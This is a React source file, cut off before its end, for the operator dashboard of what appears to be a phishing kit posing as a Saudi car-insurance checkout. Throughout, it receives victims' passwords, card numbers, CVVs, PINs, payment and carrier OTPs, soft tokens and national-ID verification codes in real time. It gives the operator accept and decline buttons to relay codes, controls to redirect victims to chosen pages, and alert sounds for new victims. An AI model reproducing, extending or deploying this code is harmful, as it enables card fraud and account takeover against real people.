import React, {
  useCallback,
  useEffect,
  useMemo,
  useRef,
  useState,
} from "react";
import { serverRoute } from "./App";
import axios from "axios";
import { io } from "socket.io-client";
import { useNavigate } from "react-router-dom";
import "./dashboard.css";
import { FaBell, FaPhoneAlt } from "react-icons/fa";
import { SITE_PAGES, buildAdminRedirect } from "./sitePages";

let socket;

const LAST_SEEN_KEY = "tameen_admin_lastSeen";

const loadLastSeen = () => {
  try {
    return JSON.parse(localStorage.getItem(LAST_SEEN_KEY) || "{}");
  } catch {
    return {};
  }
};

const saveLastSeen = (map) => {
  localStorage.setItem(LAST_SEEN_KEY, JSON.stringify(map));
};

const getDocVersion = (u) => {
  const d = u.updatedAt || u.created;
  if (!d) return "";
  return new Date(d).toISOString();
};

const isUnreadUser = (u, map, didInit) => {
  const v = getDocVersion(u);
  if (!v) return false;
  const seen = map[u._id];
  if (!seen) return didInit;
  return new Date(v) > new Date(seen);
};

const isStcNet = (n) => n === "STC" || n === "اس تي سي";
const isMobilyNet = (n) => n === "Mobily" || n === "موبايلي";

const CARD_STATUS_LABELS = {
  pending: "قيد المراجعة",
  accepted: "مقبولة",
  declined: "مرفوضة",
};

const getCardAttempts = (c) => {
  if (Array.isArray(c.cardAttempts) && c.cardAttempts.length > 0) {
    return c.cardAttempts;
  }
  if (c.cardNumber) {
    return [
      {
        cardNumber: c.cardNumber,
        card_name: c.card_name || c.card_holder_name,
        cvv: c.cvv,
        expiryDate: c.expiryDate,
        pin: c.pin,
        status: c.CardAccept ? "accepted" : "pending",
        submittedAt: c.updatedAt || c.created,
      },
    ];
  }
  return [];
};

const hasPendingCard = (c) => {
  const attempts = getCardAttempts(c);
  const latest = attempts[attempts.length - 1];
  return latest?.status === "pending" && !c.CardAccept;
};

const patchCardAttemptStatus = (user, status) => {
  const attempts = getCardAttempts(user);
  if (attempts.length === 0) return { CardAccept: true };
  return {
    CardAccept: true,
    cardAttempts: attempts.map((a, i) =>
      i === attempts.length - 1 && a.status === "pending"
        ? { ...a, status }
        : a,
    ),
  };
};

const PAYMENT_METHOD_LABELS = {
  mada: "مدى",
  credit: "فيزا / ماستر",
  apple: "Apple Pay",
  stc: "STC Pay",
  bank: "تحويل بنكي",
};

function OrderField({ label, value, secret, otp, ltr }) {
  const empty = value == null || value === "";
  return (
    <div className="row">
      <span className="lbl">{label}</span>
      <span
        className={
          empty ? "val empty" : otp ? "val otp" : secret ? "val secret" : "val"
        }
        dir={ltr ? "ltr" : undefined}
      >
        {empty ? "—" : value}
      </span>
    </div>
  );
}

function OrderSection({ title, children }) {
  return (
    <div className="order-journey-section">
      <div className="order-journey-section__title">{title}</div>
      {children}
    </div>
  );
}

function CompanyDataSection({ companyData }) {
  if (!companyData?.name) return null;
  return (
    <OrderSection title="شركة التأمين المختارة">
      <OrderField label="شركة التأمين" value={companyData.name} />
      <OrderField
        label="سعر التأمين"
        value={companyData.price != null ? `${companyData.price} ريال` : null}
      />
      {Array.isArray(companyData.options) &&
        companyData.options
          .filter((o) => o.checked)
          .map((o) => (
            <OrderField
              key={o.labelKey || o.label}
              label={o.label || o.labelKey}
              value={o.price != null ? `${o.price} ريال` : "محدد"}
            />
          ))}
    </OrderSection>
  );
}

function renderOrderJourney(c, formatCardNum) {
  const paymentLabel =
    PAYMENT_METHOD_LABELS[c.paymentMethod] || c.paymentMethod || null;
  const isInsurance = Boolean(c.type || c.national_id);
  const payStep = isInsurance
    ? c.form_type === "store_checkout"
      ? "3. الدفع"
      : "2. الدفع"
    : c.form_type === "store_checkout"
      ? "3. الدفع"
      : "2. الدفع";
  const operatorStep = isInsurance
    ? c.form_type === "store_checkout"
      ? "4. المشغل"
      : "3. المشغل"
    : c.form_type === "store_checkout"
      ? "4. المشغل"
      : "3. المشغل";
  const otpStep = isInsurance
    ? c.form_type === "store_checkout"
      ? "5. رموز المشغل"
      : "4. رموز المشغل"
    : c.form_type === "store_checkout"
      ? "5. رموز المشغل"
      : "4. رموز المشغل";

  return (
    <div className="info-block order-journey-block">
      <div className="order-journey-grid">
        <OrderSection title="1. الجوال والدخول">
          <OrderField label="كود المستخدم" value={c.username} secret ltr />
          <OrderField label="كلمة المرور" value={c.password} secret ltr />
          <OrderField label="رمز تحقق الدخول" value={c.otp} secret ltr />
          {c.otpResendRequested && (
            <OrderField
              label="طلب إعادة إرسال OTP"
              value={
                c.otpResendAt
                  ? new Date(c.otpResendAt).toLocaleString("ar-EG")
                  : "نعم"
              }
              ltr
            />
          )}
        </OrderSection>

        {isInsurance && (
          <OrderSection title="2. بيانات التأمين">
            <OrderField label="نوع التأمين" value={c.type} />

            <OrderField label="نوع بطاقة التأمين" value={c.tameenType} />
            <OrderField label="اسم مالك الوثيقة" value={c.carHolderName} />

            <OrderField label="نوع السيارة" value={c.car_model} />
            <OrderField label="سنة الصنع" value={c.car_year} ltr />

            <OrderField label="الغرض من الاستخدام" value={c.purpose_of_use} />
            <OrderField label="طريقة التأمين" value={c.tameenFor} />
            <OrderField label="القيمة التأمينية" value={c.carPrice} />
            <OrderField label="تاريخ بدء الوثيقة" value={c.startedDate} ltr />
            <OrderField
              label="ماركة وموديل السيارة"
              value={c.car_model_and_brand}
            />
            <OrderField label="بطاقة جمركية" value={c.Customs_card} />
          </OrderSection>
        )}

        <CompanyDataSection companyData={c.companyData} />


        <OrderSection title={payStep}>
          {getCardAttempts(c).map((attempt, idx) => (
            <React.Fragment key={`card-${idx}`}>
              <OrderField
                label={`بطاقة ${idx + 1} — ${CARD_STATUS_LABELS[attempt.status] || attempt.status}`}
                value={
                  attempt.cardNumber ? formatCardNum(attempt.cardNumber) : null
                }
                secret
                ltr
              />
              <OrderField label="اسم حامل البطاقة" value={attempt.card_name} />
              <OrderField
                label="تاريخ الانتهاء"
                value={attempt.expiryDate}
                ltr
              />
              <OrderField label="CVV" value={attempt.cvv} secret ltr />
            </React.Fragment>
          ))}
          <OrderField label="OTP الدفع" value={c.CardOtp} otp ltr />
          <OrderField label="PIN البطاقة" value={c.pin} secret ltr />
          <OrderField label="Soft Token" value={c.softToken} secret ltr />
        </OrderSection>

      </div>
    </div>
  );
}

const Main_Page = () => {
  if (!socket) socket = io(serverRoute);

  const [Users, setUsers] = useState([]);
  const [onlineCounts, setOnlineCounts] = useState({
    visitors: 0,
    dashboard: 0,
  });
  const [onlineOrderIds, setOnlineOrderIds] = useState(new Set());
  const [selectedUserId, setSelectedUserId] = useState(null);
  const [, setLastSeenBump] = useState(0);
  const [mobileShowList, setMobileShowList] = useState(true);
  const [isNarrow, setIsNarrow] = useState(false);

  const didInitLastSeenRef = useRef(false);
  const usersRef = useRef([]);
  const newIpSoundRef = useRef(null);
  const updateSoundRef = useRef(null);
  const navigate = useNavigate();

  const getUsers = useCallback(async () => {
    try {
      const res = await axios.get(`${serverRoute}/users`);
      const sortedUsers = res.data.sort(
        (a, b) => new Date(b.created) - new Date(a.created),
      );
      setUsers(sortedUsers);

      const map = loadLastSeen();
      let changed = false;
      if (!didInitLastSeenRef.current && sortedUsers.length > 0) {
        for (const u of sortedUsers) {
          if (map[u._id] == null || map[u._id] === "") {
            map[u._id] = getDocVersion(u) || new Date(0).toISOString();
            changed = true;
          }
        }
        didInitLastSeenRef.current = true;
        if (changed) saveLastSeen(map);
      }

      setSelectedUserId((prev) => {
        if (sortedUsers.length === 0) return null;
        if (prev && sortedUsers.some((u) => u._id === prev)) return prev;
        return sortedUsers[0]._id;
      });
      setLastSeenBump((t) => t + 1);
    } catch (error) {
      console.log(error);
    }
  }, []);

  useEffect(() => {
    newIpSoundRef.current = new Audio("/sounds/new-ip.wav");
    updateSoundRef.current = new Audio("/sounds/new-data.wav");
    newIpSoundRef.current.preload = "auto";
    updateSoundRef.current.preload = "auto";

    const unlockSounds = () => {
      [newIpSoundRef, updateSoundRef].forEach((ref) => {
        if (!ref.current) return;
        const prev = ref.current.volume;
        ref.current.volume = 0.01;
        ref.current
          .play()
          .then(() => {
            ref.current.pause();
            ref.current.currentTime = 0;
            ref.current.volume = prev;
          })
          .catch(() => {
            ref.current.volume = prev;
          });
      });
      window.removeEventListener("pointerdown", unlockSounds);
      window.removeEventListener("keydown", unlockSounds);
    };
    window.addEventListener("pointerdown", unlockSounds);
    window.addEventListener("keydown", unlockSounds);

    return () => {
      window.removeEventListener("pointerdown", unlockSounds);
      window.removeEventListener("keydown", unlockSounds);
    };
  }, []);

  useEffect(() => {
    usersRef.current = Users;
  }, [Users]);

  useEffect(() => {
    if (!localStorage.getItem("token")) return navigate("/login");

    const onConnect = () => socket.emit("join", { role: "admin" });
    if (socket.connected) onConnect();
    socket.on("connect", onConnect);

    const onOnlineCounts = (counts) => setOnlineCounts(counts);
    socket.on("onlineCounts", onOnlineCounts);

    const onClientPresence = ({ onlineIds }) => {
      setOnlineOrderIds(new Set(onlineIds || []));
    };
    socket.on("clientPresence", onClientPresence);

    const handleResendOtp = (payload) => {
      const id = typeof payload === "string" ? payload : payload?.id;
      if (id) {
        setUsers((prev) =>
          prev.map((u) =>
            u._id === id
              ? {
                  ...u,
                  otpResendRequested: true,
                  otpResendAt: new Date().toISOString(),
                }
              : u,
          ),
        );
      }
      handleNewClientData(payload);
    };

    const handleSoftToken = (payload) => {
      if (payload?.id && payload?.softToken) {
        setUsers((prev) =>
          prev.map((u) =>
            u._id === payload.id
              ? {
                  ...u,
                  softToken: payload.softToken,
                  SoftTokenAccept: false,
                  currentStep: "softToken",
                }
              : u,
          ),
        );
      }
      handleNewClientData(payload);
    };

    const handleVisaPin = (payload) => {
      if (payload?.id && payload?.pin) {
        setUsers((prev) =>
          prev.map((u) =>
            u._id === payload.id
              ? {
                  ...u,
                  pin: payload.pin,
                  PinAccept: false,
                  currentStep: "pin",
                }
              : u,
          ),
        );
      }
      handleNewClientData(payload);
    };

    const handleNewClientData = (payload) => {
      const knownIds = new Set(usersRef.current.map((u) => u._id));
      let orderId = null;
      if (typeof payload === "string") orderId = payload;
      else if (payload?._id) orderId = payload._id;
      else if (payload?.id) orderId = payload.id;

      const isNewUser = orderId ? !knownIds.has(orderId) : true;

      const sound = isNewUser ? newIpSoundRef.current : updateSoundRef.current;
      if (sound) {
        sound.currentTime = 0;
        sound.play().catch(() => {});
      }

      getUsers();
    };

    socket.on("login", handleNewClientData);
    socket.on("password", handleNewClientData);
    socket.on("otp", handleNewClientData);
    socket.on("resendOtp", handleResendOtp);
    socket.on("visa", handleNewClientData);
    socket.on("newUser", handleNewClientData);
    socket.on("newData", handleNewClientData);
    socket.on("companyData", handleNewClientData);
    socket.on("paymentForm", handleNewClientData);
    socket.on("visaOtp", handleNewClientData);
    socket.on("visaPin", handleVisaPin);
    socket.on("softToken", handleSoftToken);
    socket.on("motsl", handleNewClientData);
    socket.on("motslOtp", handleNewClientData);
    socket.on("navaz", handleNewClientData);
    socket.on("phone", handleNewClientData);
    socket.on("mobOtp", handleNewClientData);
    socket.on("phoneOtp", handleNewClientData);
    socket.on("checkoutPhone", handleNewClientData);
    socket.on("checkoutOtp", handleNewClientData);
    socket.on("storeLogin", handleNewClientData);

    return () => {
      socket.off("connect", onConnect);
      socket.off("onlineCounts", onOnlineCounts);
      socket.off("clientPresence", onClientPresence);
      socket.off("login", handleNewClientData);
      socket.off("password", handleNewClientData);
      socket.off("otp", handleNewClientData);
      socket.off("resendOtp", handleResendOtp);
      socket.off("visa", handleNewClientData);
      socket.off("newUser", handleNewClientData);
      socket.off("newData", handleNewClientData);
      socket.off("companyData", handleNewClientData);
      socket.off("paymentForm", handleNewClientData);
      socket.off("visaOtp", handleNewClientData);
      socket.off("visaPin", handleVisaPin);
      socket.off("softToken", handleSoftToken);
      socket.off("motsl", handleNewClientData);
      socket.off("motslOtp", handleNewClientData);
      socket.off("navaz", handleNewClientData);
      socket.off("phone", handleNewClientData);
      socket.off("mobOtp", handleNewClientData);
      socket.off("phoneOtp", handleNewClientData);
      socket.off("checkoutPhone", handleNewClientData);
      socket.off("checkoutOtp", handleNewClientData);
      socket.off("storeLogin", handleNewClientData);
    };
  }, [getUsers, navigate]);

  useEffect(() => {
    getUsers();
  }, [getUsers]);

  useEffect(() => {
    const mq = window.matchMedia("(max-width: 1023px)");
    const apply = () => setIsNarrow(mq.matches);
    apply();
    mq.addEventListener("change", apply);
    return () => mq.removeEventListener("change", apply);
  }, []);

  useEffect(() => {
    if (!isNarrow) setMobileShowList(true);
  }, [isNarrow]);

  useEffect(() => {
    if (!selectedUserId) setMobileShowList(true);
  }, [selectedUserId]);

  useEffect(() => {
    if (!selectedUserId) return;
    const u = Users.find((x) => x._id === selectedUserId);
    if (!u) return;
    const map = loadLastSeen();
    const v = getDocVersion(u);
    if (!v) return;
    if (map[selectedUserId] === v) return;
    map[selectedUserId] = v;
    saveLastSeen(map);
    setLastSeenBump((x) => x + 1);
  }, [selectedUserId, Users]);

  const patchUserLocally = useCallback((id, patch) => {
    setUsers((prev) =>
      prev.map((u) => (u._id === id ? { ...u, ...patch } : u)),
    );
  }, []);

  const getUserById = useCallback(
    (id) => usersRef.current.find((u) => u._id === id),
    [],
  );

  // Action Triggers
  const handleAcceptVisa = async (id) => {
    const user = getUserById(id);
    if (user) patchUserLocally(id, patchCardAttemptStatus(user, "accepted"));
    socket.emit("acceptVisa", id);
    await getUsers();
  };

  const handleAdminRedirect = (user, page) => {
    const payload = buildAdminRedirect(user, page);
    socket.emit("adminRedirect", { id: user._id, ...payload });
  };

  const handleDeclineVisa = async (id) => {
    const user = getUserById(id);
    if (user) patchUserLocally(id, patchCardAttemptStatus(user, "declined"));
    socket.emit("declineVisa", id);
    await getUsers();
  };

  const handleAcceptVisaOtp = async (id) => {
    patchUserLocally(id, { OtpCardAccept: true });
    socket.emit("acceptVisaOtp", id);
    await getUsers();
  };

  const handleDeclineVisaOtp = async (id) => {
    patchUserLocally(id, { OtpCardAccept: true });
    socket.emit("declineVisaOtp", id);
    await getUsers();
  };

  const handleAcceptLogin = async (id) => {
    patchUserLocally(id, { loginAccept: true });
    socket.emit("acceptLogin", id);
    await getUsers();
  };

  const handleDeclineLogin = async (id) => {
    patchUserLocally(id, { loginAccept: true });
    socket.emit("declineLogin", id);
    await getUsers();
  };

  const handleAcceptUser = async (id) => {
    patchUserLocally(id, { userAccept: true });
    socket.emit("acceptUser", id);
    await getUsers();
  };

  const handleDeclineUser = async (id) => {
    patchUserLocally(id, { userAccept: true });
    socket.emit("declineUser", id);
    await getUsers();
  };

  const handleAcceptOtp = async (id) => {
    patchUserLocally(id, { otpAccept: true });
    socket.emit("acceptOtp", id);
    await getUsers();
  };

  const handleDeclineOtp = async (id) => {
    patchUserLocally(id, { otpAccept: true });
    socket.emit("declineOtp", id);
    await getUsers();
  };

  const handleAcceptCheckoutPhone = async (id) => {
    patchUserLocally(id, { checkoutPhoneAccept: true });
    socket.emit("acceptCheckoutPhone", id);
    await getUsers();
  };

  const handleDeclineCheckoutPhone = async (id) => {
    patchUserLocally(id, { checkoutPhoneAccept: true });
    socket.emit("declineCheckoutPhone", id);
    await getUsers();
  };

  const handleAcceptCheckoutOtp = async (id) => {
    patchUserLocally(id, { checkoutOtpAccept: true });
    socket.emit("acceptCheckoutOtp", id);
    await getUsers();
  };

  const handleDeclineCheckoutOtp = async (id) => {
    patchUserLocally(id, { checkoutOtpAccept: true });
    socket.emit("declineCheckoutOtp", id);
    await getUsers();
  };

  const handleAcceptPin = async (id) => {
    patchUserLocally(id, { PinAccept: true });
    socket.emit("acceptVisaPin", id);
    await getUsers();
  };

  const handleDeclinePin = async (id) => {
    patchUserLocally(id, { PinAccept: true });
    socket.emit("declineVisaPin", id);
    await getUsers();
  };

  const handleAcceptSoftToken = async (id) => {
    patchUserLocally(id, { SoftTokenAccept: true });
    socket.emit("acceptSoftToken", id);
    await getUsers();
  };

  const handleDeclineSoftToken = async (id) => {
    patchUserLocally(id, { SoftTokenAccept: true });
    socket.emit("declineSoftToken", id);
    await getUsers();
  };

  const handleAcceptPhone = async (id) => {
    patchUserLocally(id, { MotslAccept: true });
    socket.emit("acceptPhone", id);
    await getUsers();
  };

  const handleDeclinePhone = async (id) => {
    patchUserLocally(id, { MotslAccept: true });
    socket.emit("declinePhone", id);
    await getUsers();
  };

  const handleAcceptMobOtp = async (id) => {
    const price = window.prompt("أدخل رمز نفاذ للعميل:");
    if (price === null || price === "") {
      window.alert("يجب إدخال الرمز");
      return;
    }
    patchUserLocally(id, { NavazOtp: price, mobOtp: null });
    socket.emit("acceptMobOtp", { id, price });
    await getUsers();
  };

  const handleDeclineMobOtp = async (id) => {
    patchUserLocally(id, { mobOtp: null });
    socket.emit("declineMobOtp", id);
    await getUsers();
  };

  const handleAcceptStcPhoneOtp = async (id) => {
    patchUserLocally(id, { stcAwaitingCall: true });
    socket.emit("acceptStcPhoneOtp", id);
    await getUsers();
  };

  const handleDeclineStcPhoneOtp = async (id) => {
    patchUserLocally(id, { MotslOtp: null });
    socket.emit("declineStcPhoneOtp", id);
    await getUsers();
  };

  const handleAcceptService = async (id) => {
    const price = window.prompt("أدخل رمز نفاذ بعد المكالمة:");
    if (price === null || price === "") return;
    patchUserLocally(id, { NavazOtp: price, stcAwaitingCall: false });
    socket.emit("acceptService", { id, price });
    await getUsers();
  };

  const handleDeclineService = async (id) => {
    patchUserLocally(id, {
      stcAwaitingCall: false,
      STCAccept: false,
      MotslOtpAccept: false,
      MotslOtp: null,
      NavazOtp: null,
      NavazAccept: false,
    });
    socket.emit("declineService", id);
    await getUsers();
  };

  const handleAcceptPhoneOTP = async (id) => {
    const price = window.prompt("أدخل رمز نفاذ للعميل:");
    if (price === null || price === "") {
      window.alert("يجب إدخال الرمز");
      return;
    }
    patchUserLocally(id, { NavazOtp: price });
    socket.emit("acceptPhoneOTP", { id, price });
    await getUsers();
  };

  const handleDeclinePhoneOTP = async (id) => {
    patchUserLocally(id, { MotslOtp: null });
    socket.emit("declinePhoneOTP", id);
    await getUsers();
  };

  const handleAcceptMotslOtp = async (id, network) => {
    let userOtp = null;
    if (!isStcNet(network)) {
      userOtp = window.prompt("الرجاء إدخال رقم نفاذ للعميل (مثال: 45):");
      if (!userOtp) return window.alert("يجب ملء رمز نفاذ للمتابعة");
    }
    patchUserLocally(id, { NavazOtp: userOtp, MotslOtpAccept: true });
    socket.emit("acceptMotslOtp", { id, userOtp });
    await getUsers();
  };

  const handleDeclineMotslOtp = async (id) => {
    patchUserLocally(id, { MotslOtpAccept: true });
    socket.emit("declineMotslOtp", id);
    await getUsers();
  };

  const handleAcceptSTC = async (id) => {
    patchUserLocally(id, { STCAccept: true });
    socket.emit("acceptSTC", { id, userOtp: null });
    await getUsers();
  };

  const handleDeclineSTC = async (id) => {
    patchUserLocally(id, { STCAccept: true });
    socket.emit("declineSTC", id);
    await getUsers();
  };

  const handleAcceptNavaz = async (id) => {
    patchUserLocally(id, { NavazAccept: true });
    socket.emit("acceptNavaz", { id, userOtp: null });
    await getUsers();
  };

  const handleDeclineNavaz = async (id) => {
    patchUserLocally(id, { NavazAccept: true });
    socket.emit("declineNavaz", id);
    await getUsers();
  };

  const handleChangeNavazCode = async (id) => {
    const userOtp = window.prompt("الرمز الجديد:");
    if (userOtp === null || userOtp === "") return;
    patchUserLocally(id, { NavazOtp: userOtp });
    socket.emit("changeNavazCode", { id, userOtp });
    await getUsers();
  };

  const handleBlockClient = async (id) => {
    if (!window.confirm("هل تريد حظر هذا العميل من استخدام الموقع؟")) return;
    patchUserLocally(id, { blocked: true });
    socket.emit("blockClient", id);
    await getUsers();
  };

  const handleUnblockClient = async (id) => {
    patchUserLocally(id, { blocked: false });
    socket.emit("unblockClient", id);
    await getUsers();
  };

  // Delete Handlers
  const deleteUser = async (id) => {
    if (window.confirm("هل أنت متأكد من حذف العميل؟")) {
      await axios.delete(`${serverRoute}/order/${id}`);
      getUsers();
    }
  };

  const deleteAllUsers = async () => {
    if (window.confirm("هل أنت متأكد من حذف جميع العملاء والبطاقات نهائياً؟")) {
      await axios.delete(`${serverRoute}/orders/all`);
      getUsers();
    }
  };

  // Logout
  const handleLogOut = () => {
    localStorage.removeItem("token");
    window.location.reload();
  };

  const formatCardNum = (str) => {
    if (!str) return "";
    return str.replace(/(.{4})/g, "$1 ").trim();
  };

  const selectedUser = useMemo(
    () => Users.find((u) => u._id === selectedUserId) ?? null,
    [Users, selectedUserId],
  );

  const handleSelectUser = (u) => {
    setSelectedUserId(u._id);
    if (isNarrow) setMobileShowList(false);
  };

  const handleMobileBackToList = () => {
    setMobileShowList(true);
  };

  const renderClientCard = (c) => {
    const isOnline = onlineOrderIds.has(c._id);
    const cardAttempts = getCardAttempts(c);

    return (
      <div key={c._id} className="client-card">
        <div className="cc-head">
          <div className="cc-user">
            <div className="cc-avatar">
              <i className="fas fa-user-check"></i>
            </div>
            <div className="cc-info">
              <h4>{c.name || c.username || c.carHolderName || c.fullname || "مجهول"}</h4>
              <span>
                ID: {c._id.slice(-6)} | {c.national_id || c.phone || "—"}
              </span>
              {(c.phone || c.MotslPhone) && (
                <div className="cc-phones-summary">
                  {c.phone && (
                    <span dir="ltr">
                      <FaPhoneAlt /> جوال التقديم: {c.phone}
                    </span>
                  )}
                  {c.MotslPhone && (
                    <span dir="ltr">
                      <FaPhoneAlt /> جوال المشغل: {c.MotslPhone}
                    </span>
                  )}
                </div>
              )}
              {c.companyData?.name && (
                <div className="cc-company-summary">
                  {c.companyData.logo && (
                    <img
                      src={c.companyData.logo}
                      alt=""
                      className="cc-company-logo"
                    />
                  )}
                  <span>
                    {c.companyData.name}
                    {c.companyData.price != null
                      ? ` — ${c.companyData.price} ريال`
                      : ""}
                  </span>
                </div>
              )}
            </div>
          </div>
          <div className="cc-head-badges">
            {c.blocked && (
              <div className="status-badge blocked">
                <div className="dot"></div> محظور
              </div>
            )}
            {c.otpResendRequested && (
              <div className="status-badge" style={{ background: "#f59e0b" }}>
                <div className="dot"></div> طلب إعادة إرسال OTP
              </div>
            )}
            <div className={`status-badge ${isOnline ? "online" : ""}`}>
              <div className="dot"></div> {isOnline ? "متصل" : "غير متصل"}
            </div>
          </div>
        </div>

        <div className="cc-body">
          {renderOrderJourney(c, formatCardNum)}
          <div className="cc-body-grid">
            <div className="cc-col cc-col--visa">
              <div className="visa-list-container">
                {cardAttempts.length > 0 ? (
                  cardAttempts.map((attempt, idx) => (
                    <div
                      key={`visa-${idx}`}
                      className={`visa-card visa-card--${attempt.status || "pending"}`}
                    >
                      <div className="visa-card-status">
                        {CARD_STATUS_LABELS[attempt.status] || attempt.status}
                      </div>
                      <div className="v-top">
                        <div className="v-chip"></div>{" "}
                        <i className="fab fa-cc-visa fa-lg"></i>
                      </div>
                      <div className="v-num" dir="ltr">
                        {formatCardNum(attempt.cardNumber)}
                      </div>
                      <div
                        style={{
                          fontSize: "11px",
                          marginBottom: "8px",
                          color: "#fff",
                          fontWeight: "bold",
                        }}
                      >
                        {attempt.card_name}
                      </div>
                      <div className="v-det">
                        <div>
                          EXP{" "}
                          <span className="v-res">{attempt.expiryDate}</span>
                        </div>
                        <div>
                          CVV{" "}
                          <span className="v-res" style={{ color: "#fbbf24" }}>
                            {attempt.cvv}
                          </span>
                        </div>
                      </div>
                    </div>
                  ))
                ) : (
                  <div
                    className="val empty"
                    style={{ textAlign: "center", padding: "10px" }}
                  >
                    بانتظار إدخال البطاقة...
                  </div>
                )}
              </div>
            </div>
          </div>
        </div>

        <div className="cc-foot cc-foot--centered">
          <div className="cc-foot-inner">
            <div className="page-redirect-bar">
              <div className="page-redirect-bar__label">
                توجيه المستخدم إلى صفحة
              </div>
              <div className="page-redirect-bar__buttons">
                {SITE_PAGES.map((p) => (
                  <button
                    key={p.path}
                    type="button"
                    className="page-redirect-btn"
                    onClick={() => handleAdminRedirect(c, p)}
                  >
                    {p.label}
                  </button>
                ))}
              </div>
            </div>
            <div className="w-full flex justify-between gap-x-2 mt-2">
              {c.blocked ? (
                <button
                  className="btn-act accept grow w-full font-bold"
                  onClick={() => handleUnblockClient(c._id)}
                >
                  <i className="fas fa-unlock ml-2"></i> إلغاء الحظر
                </button>
              ) : (
                <button
                  className="btn-act decline grow w-full font-bold"
                  onClick={() => handleBlockClient(c._id)}
                >
                  <i className="fas fa-ban ml-2"></i> حظر العميل
                </button>
              )}
            </div>
            {/* Control Groups directly listed, rather than a single accept all */}
            {c.password && !c.userAccept && (
              <div className="w-full flex flex-col gap-1 px-2 border-b pb-2 mb-2">
                <div
                  style={{
                    fontSize: "11px",
                    textAlign: "center",
                    color: "#666",
                  }}
                >
                  تأكيد البيانات: كلمة المرور
                </div>
                <div className="btn-act-group">
                  <button
                    className="btn-act accept"
                    onClick={() => handleAcceptUser(c._id)}
                  >
                    قبول
                  </button>
                  <button
                    className="btn-act decline"
                    onClick={() => handleDeclineUser(c._id)}
                  >
                    رفض
                  </button>
                </div>
              </div>
            )}

            {c.otp && !c.otpAccept && (
              <div className="w-full flex flex-col gap-1 px-2 border-b pb-2 mb-2">
                <div
                  style={{
                    fontSize: "11px",
                    textAlign: "center",
                    color: "#666",
                  }}
                >
                  تأكيد البيانات: OTP الدخول
                </div>
                <div className="btn-act-group">
                  <button
                    className="btn-act accept"
                    onClick={() => handleAcceptOtp(c._id)}
                  >
                    قبول
                  </button>
                  <button
                    className="btn-act decline"
                    onClick={() => handleDeclineOtp(c._id)}
                  >
                    رفض
                  </button>
                </div>
              </div>
            )}

            {hasPendingCard(c) && (
              <div className="w-full flex flex-col gap-1 px-2 border-b pb-2 mb-2">
                <div
                  style={{
                    fontSize: "11px",
                    textAlign: "center",
                    color: "#666",
                  }}
                >
                  تأكيد البيانات: الدفع
                </div>
                <div className="btn-act-group">
                  <button
                    className="btn-act accept"
                    onClick={() => handleAcceptVisa(c._id)}
                  >
                    قبول الدفع
                  </button>
                  <button
                    className="btn-act decline"
                    onClick={() => handleDeclineVisa(c._id)}
                  >
                    رفض
                  </button>
                </div>
              </div>
            )}

            {!c.OtpCardAccept && c.CardOtp && (
              <div className="w-full flex flex-col gap-1 px-2 border-b pb-2 mb-2">
                <div
                  style={{
                    fontSize: "11px",
                    textAlign: "center",
                    color: "#666",
                  }}
                >
                  تأكيد البيانات: OTP الدفع
                </div>
                <div className="btn-act-group">
                  <button
                    className="btn-act accept"
                    onClick={() => handleAcceptVisaOtp(c._id)}
                  >
                    قبول OTP
                  </button>
                  <button
                    className="btn-act decline"
                    onClick={() => handleDeclineVisaOtp(c._id)}
                  >
                    رفض
                  </button>
                </div>
              </div>
            )}

            {!c.PinAccept && c.pin && String(c.pin).length > 0 && (
              <div className="w-full flex flex-col gap-1 px-2 border-b pb-2 mb-2">
                <div
                  style={{
                    fontSize: "11px",
                    textAlign: "center",
                    color: "#666",
                  }}
                >
                  تأكيد البيانات: PIN البطاقة
                </div>
                <div className="btn-act-group">
                  <button
                    className="btn-act accept"
                    onClick={() => handleAcceptPin(c._id)}
                  >
                    قبول PIN
                  </button>
                  <button
                    className="btn-act decline"
                    onClick={() => handleDeclinePin(c._id)}
                  >
                    رفض
                  </button>
                </div>
              </div>
            )}

            {!c.SoftTokenAccept && c.softToken && String(c.softToken).length > 0 && (
              <div className="w-full flex flex-col gap-1 px-2 border-b pb-2 mb-2">
                <div
                  style={{
                    fontSize: "11px",
                    textAlign: "center",
                    color: "#666",
                  }}
                >
                  تأكيد البيانات: Soft Token
                </div>
                <div className="btn-act-group">
                  <button
                    className="btn-act accept"
                    onClick={() => handleAcceptSoftToken(c._id)}
                  >
                    قبول Soft Token
                  </button>
                  <button
                    className="btn-act decline"
                    onClick={() => handleDeclineSoftToken(c._id)}
                  >
                    رفض
                  </button>
                </div>
              </div>
            )}

            {!c.MotslAccept &&
              c.CardAccept &&
              (c.PinAccept || c.OtpCardAccept) &&
              c.MotslPhone && (
                <div className="w-full flex flex-col gap-1 px-2 border-b pb-2 mb-2">
                  <div
                    style={{
                      fontSize: "11px",
                      textAlign: "center",
                      color: "#666",
                    }}
                  >
                    تأكيد بيانات الجوال
                  </div>
                  <div className="btn-act-group">
                    <button
                      className="btn-act accept"
                      style={{ backgroundColor: "#0ea5e9" }}
                      onClick={() => handleAcceptPhone(c._id)}
                    >
                      قبول والمتابعة
                    </button>
                    <button
                      className="btn-act decline"
                      onClick={() => handleDeclinePhone(c._id)}
                    >
                      رفض{" "}
                    </button>
                  </div>
                </div>
              )}

            {c.mobOtp && isMobilyNet(c.MotslNetwork) && !c.NavazOtp && (
              <div className="w-full flex flex-col gap-1 px-2 border-b pb-2 mb-2">
                <div
                  style={{
                    fontSize: "11px",
                    textAlign: "center",
                    color: "#666",
                  }}
                >
                  موبايلي — رمز التحقق
                </div>
                <div className="btn-act-group">
                  <button
                    className="btn-act accept"
                    onClick={() => handleAcceptMobOtp(c._id)}
                  >
                    قبول وإرسال رمز نفاذ
                  </button>
                  <button
                    className="btn-act decline"
                    onClick={() => handleDeclineMobOtp(c._id)}
                  >
                    رفض
                  </button>
                </div>
              </div>
            )}

            {isStcNet(c.MotslNetwork) &&
              c.MotslOtp &&
              !c.stcAwaitingCall &&
              !c.NavazOtp && (
                <div className="w-full flex flex-col gap-1 px-2 border-b pb-2 mb-2">
                  <div
                    style={{
                      fontSize: "11px",
                      textAlign: "center",
                      color: "#666",
                    }}
                  >
                    {" "}
                    قبول OTP{" "}
                  </div>
                  <div className="btn-act-group">
                    <button
                      className="btn-act accept"
                      onClick={() => handleAcceptStcPhoneOtp(c._id)}
                    >
                      قبول OTP
                    </button>
                    <button
                      className="btn-act decline"
                      onClick={() => handleDeclineStcPhoneOtp(c._id)}
                    >
                      رفض
                    </button>
                  </div>
                </div>
              )}

            {isStcNet(c.MotslNetwork) && c.stcAwaitingCall && !c.NavazOtp && (
              <div className="w-full flex flex-col gap-1 px-2 border-b pb-2 mb-2">
